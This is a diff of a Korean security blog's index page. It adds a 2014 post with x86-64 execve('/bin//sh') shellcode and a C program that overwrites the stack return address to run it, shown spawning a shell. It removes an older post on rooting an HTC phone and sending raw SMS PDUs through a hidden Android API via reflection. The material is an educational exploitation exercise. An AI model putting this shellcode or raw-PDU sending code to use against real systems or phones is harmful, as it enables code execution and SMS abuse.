@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="callee 스택을 파괴하는 예제를 짜보았다. callee stackframe 에서 return address 를 _shellcode 의 어드레스로 바꿔서 retq 가 실행될때 저기로 튀도록 한다. char *_shellcode = "" "\x48\x31\xd2 &hellip;">
+  <meta name="description" content="이번에는 계산해서 return address 를 덮어쓰는 것이 아니라, 80 바이트정도로 스택 프레임을 밀어본다. 그래도 동작한다. char *_shellcode = "" "\x48\x31\xd2" "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,67 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/10/linux-x86-64-shellcode-3/">Linux X86_64 Shellcode 3</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-10T01:41:33+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:41 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>이번에는 계산해서 <code>return address</code> 를 덮어쓰는 것이 아니라, 80 바이트정도로 스택 프레임을 밀어본다. 그래도 동작한다.</p>
+
+<pre><code>char *_shellcode = ""
+    "\x48\x31\xd2"
+    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+    "\x48\xc1\xeb\x08"
+    "\x53"
+    "\x48\x89\xe7"
+    "\x48\x31\xc0"
+    "\x50"
+    "\x57"
+    "\x48\x89\xe6"
+    "\xb0\x3b"
+    "\x0f\x05" ;
+
+char *_shells[10];
+
+void explode() {
+    long *ret;
+    memcpy(&amp;ret,_shells,8*10);
+}
+
+main()
+{
+    int i;
+    for (i=0;i&lt;10;i++) _shells[i]=_shellcode;
+    explode();
+}
+
+z@ubuntu:~/shells% gcc s3.c -o s3
+z@ubuntu:~/shells% ./s3
+$ 
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -835,138 +896,6 @@ _gettch();
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/09/19/sendrawpdu/">Sendrawpdu</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-09-19T17:51:04+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>5:51 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h4>Unlock &amp; Rooting</h4>
-
-<p>HTC One M7 을 준비했다.</p>
-
-<p><code>./fastboot-mac oem get_identifier_token</code> 로 token 을 얻어 htcdev.com 에 submit 하고 언락 코드를 얻는다. 그 코드로
-<code>fastboot-mac flash unlocktoken Unlock_code.bin</code> 를 하여서 부트로더 언락을 마친다.</p>
-
-<p>Power + Volume Down 으로 들어가보면 <code>*** UNLOCKED ***</code> 라고 바뀌게 된다. S-ON 은 유지된 상태.</p>
-
-<p>참고로, Unlock 하면 bootloader 등의 파티션을 접근할 수 있고, S-OFF 를 하면 HBOOT 와 RADIO 까지 write 할 수 있다.</p>
-
-<p>언락후에, <a href="http://htconeroot.com/cwmtwrp-recoveries/">ClockwordMod Recovery</a> 를 설치하였다.</p>
-
-<h4>Xposed framework</h4>
-
-<p>그 다음에, <a href="http://forum.xda-developers.com/xposed/xposed-installer-versions-changelog-t2714053">Xposed framework</a> 를 설치한다.</p>
-
-<h4>SMS-DELIVERY</h4>
-
-<p><a href="http://www.androidpub.com/724734">국내 (SKT/KTF) SMS 처리 - HTC RIL 코드를 분석하면서</a></p>
-
-<pre><code>PDU 0791280102198188 44 0A A1 5117180890 00040180229101826313 0A22080B811040309814F761623132B0A1B3AA
-
-07: SMSC Octet Size
-91: Type-of-address of the SMSC
-28 01 02 19 81 88: Service Center +821020911888
-44: TP-UDHI, TP-MMS
-0A: Length of Sender Number
-A1: 1010 0001 National Number/ISDN/Telephone Numbering Plan
-51 17 18 08 90: 
-
-Text message
-From: 1571818009
-Message: 0A22080B811040309814F761623132B0A1B3AA
-
-Additional information
-PDU type: SMS-DELIVER
-Time stamp: 22/08/2010 19:10:28
-SMSC: +821020911888
-Data header: 0A22080B811040309814F7
-Data coding: Binary
-
-Original Encoded PDU fields
-SMSC: 0791280102198188
-PDU header: 44
-TP-MTI: 00
-TP-MMS: 04
-TP-SRI: 00
-TP-RP: 00
-TP-UDHI: 40
-TP-OA: 0AA15117180890
-TP-PID: 00
-TP-DCS: 04
-TP-SCTS: 01802291018263
-TP-UDL: 13
-TP-UD: 0A22080B811040309814F761623132B0A1B3AA
-</code></pre>
-
-<h4>SMS-SUBMIT</h4>
-
-<h4>smspdu</h4>
-
-<p><a href="https://github.com/crmulliner/smspdu">crmulliner/smspdu</a> 를 참조.</p>
-
-<p>HTC Sense firmware 의 hidden API sendRawPdu() 를 사용하는 방법은 다음과 같다.</p>
-
-<pre><code>import android.telephony.SmsManager;
-import java.lang.reflect.Method;
-
-SmsManager sm = SmsManager.getDefault();
-byte[] bb = new byte[1];
-Method m2 = SmsManager.class.getDeclaredMethod(
-    "sendRawPdu",
-    bb.getClass(),
-    bb.getClass(),
-    PendingIntent.class,
-    PendingIntent.class,
-    boolean.class,
-    boolean.class);
-m2.setAccessible(true);
-byte[] pdu = convertHex2Bin(msg.getBytes());
-m2.invoke(sm, null, pdu, null, null, false, false);
-</code></pre>
-
-<p>그리고, <a href="http://pastebin.com/6uueFLCU">HushSMS 의 리버스된 소스</a>를 참조.</p>
-
-<h4>Payload 읽기</h4>
-
-<pre><code>public static byte[] payload() {
-    FileInputStream fis;
-    byte[] by = new byte[1024];
-    int count;
-
-    try {
-        fis = new FileInputStream("/sdcard/payload");
-        count = fis.read(by);
-        fis.close();
-        return by;
-    } catch (Exception e) {
-        e.printStackTrace();
-    }
-    return by;
-}
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/12">&larr; Older</a>
@@ -984,6 +913,10 @@ m2.invoke(sm, null, pdu, null, null, false, false);
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/02/03/qseecom/">Qseecom</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/15/tf-idf/">TF-IDF</a>
       </li>
     
@@ -997,10 +930,6 @@ m2.invoke(sm, null, pdu, null, null, false, false);
     
       <li class="post">
         <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
       </li>
     
   </ul>
